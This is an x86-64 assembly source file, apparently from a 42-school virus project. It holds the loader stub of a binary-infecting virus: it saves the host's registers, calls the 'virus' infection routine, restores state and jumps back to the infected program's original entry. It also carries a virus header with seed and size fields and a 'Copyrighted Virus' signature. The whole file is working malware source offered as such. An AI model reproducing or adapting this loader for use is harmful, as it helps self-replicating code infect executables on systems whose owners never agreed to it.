; **************************************************************************** ;
;                                                                              ;
;                                                         :::      ::::::::    ;
;    loader.s                                           :+:      :+:    :+:    ;
;                                                     +:+ +:+         +:+      ;
;    By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+         ;
;                                                 +#+#+#+#+#+   +#+            ;
;    Created: 2019/02/11 14:08:33 by agrumbac          #+#    #+#              ;
;    Updated: 2021/06/15 19:40:20 by ichkamo          ###   ########.fr        ;
;                                                                              ;
; **************************************************************************** ;

section .text
	global loader_entry
	global call_virus
	global jump_back_to_client
	global loader_exit
	global virus_header_struct

extern virus

;----------------------------------; backup all swappable registers
;                                    (all but rax, rsp, rbp)
loader_entry:
	push rcx                   ; backup rcx
	push rdx                   ; backup rdx
	push rbx                   ; backup rbx
	push rsi                   ; backup rsi
	push rdi                   ; backup rdi
	push r8                    ; backup r8
	push r9                    ; backup r9
	push r10                   ; backup r10
	push r11                   ; backup r11
	push r12                   ; backup r12
	push r13                   ; backup r13
	push r14                   ; backup r14
	push r15                   ; backup r15

;----------------------------------; launch infection routines

; space for structure fields
	sub rsp, end_virus_header - virus_header_struct
; loader_entry
	lea r8, [rel loader_entry]
	mov [rsp + 0x10], r8
; virus_size
	lea r9, [rel virus_header_struct + 0x8]
	mov r9, [r9]
	mov [rsp + 0x8], r9
; seed
	lea r10, [rel virus_header_struct]
	mov r10, [r10]
	mov [rsp], r10
; pass structure address
	mov rdi, rsp
call_virus:
	call virus                 ; call virus (addr rewritten by virus)

; free space for structure fields
	add rsp, end_virus_header - virus_header_struct

;----------------------------------; restore registers
return_to_client:
	pop r15                    ; restore r15
	pop r14                    ; restore r14
	pop r13                    ; restore r13
	pop r12                    ; restore r12
	pop r11                    ; restore r11
	pop r10                    ; restore r10
	pop r9                     ; restore r9
	pop r8                     ; restore r8
	pop rdi                    ; restore rdi
	pop rsi                    ; restore rsi
	pop rbx                    ; restore rbx
	pop rdx                    ; restore rdx
	pop rcx                    ; restore rcx

jump_back_to_client:
	jmp 0xffffffff             ; jump back to entry (addr written by virus)
loader_exit:

virus_header_struct:
	; db 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 ; virus seed (placeholder)
	; db 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66 ; virus size (placeholder)
	; db 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77, 0x77 ; loader entry (placeholder)
	db 0xD5, 0xEE, 0xF5, 0xE1, 0xAD, 0xDB, 0xDE, 0xFA ; virus seed (placeholder)
	dq loader_entry                                   ; virus size (placeholder)
	dq loader_entry                                   ; loader entry (placeholder)
end_virus_header:
	db "Warning : Copyrighted Virus by __UNICORNS_OF_THE_APOCALYPSE__ <3"


; 127905555555555
